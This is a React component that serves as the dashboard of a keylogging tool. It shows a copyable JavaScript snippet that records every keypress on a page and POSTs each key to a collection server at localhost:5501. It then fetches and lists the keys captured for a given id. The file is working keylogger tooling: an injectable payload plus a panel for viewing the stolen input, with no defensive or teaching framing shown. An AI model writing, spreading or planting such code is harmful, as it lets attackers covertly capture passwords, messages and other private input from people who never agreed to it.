import React, { useEffect, useState } from 'react';
import { useParams } from 'react-router-dom';
import axios from "axios";

const Keylogger = () => {
  let { id } = useParams();
  const [loggedKeys, setLoggedKeys] = useState([]);

  useEffect(() => {
    const fetchLoggedKeys = async () => {
      try {
        const response = await axios.get(`http://localhost:5501/${id}/getkeyloggerdata`);
        setLoggedKeys(response.data);
      } catch (error) {
        console.error("Error fetching logged keys:", error);
      }
    };

    fetchLoggedKeys();
  }, [id]);

  const codeString = `
document.addEventListener("keypress", async (e) => {
  const url = "http://localhost:5501/${id}/keylogger";
  const payload = {
    pressedKey: e.key,
  };

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(\`Response status: \${response.status}\`);
    }

    const json = await response.json();
    console.log(json);
  } catch (error) {
    console.error("Error sending key:", error.message);
  }
});
  `;

  return (
    <div>
      <h1>Keylogger Data</h1>
      <div className='border border-danger py-3 px-5 bg-dark text-success'>
        <pre>
          <code>{codeString}</code>
        </pre>
      </div>
      <div className='container'>
        <ul className='d-flex flex-wrap gap-2' style={{ listStyle: "none" }}>
          {loggedKeys.map((key, index) => (
            <li key={index} className='nav-items shadow p-2'>{JSON.stringify(key)}</li>
          ))}
        </ul>
      </div>
    </div>
  );
};

export default Keylogger;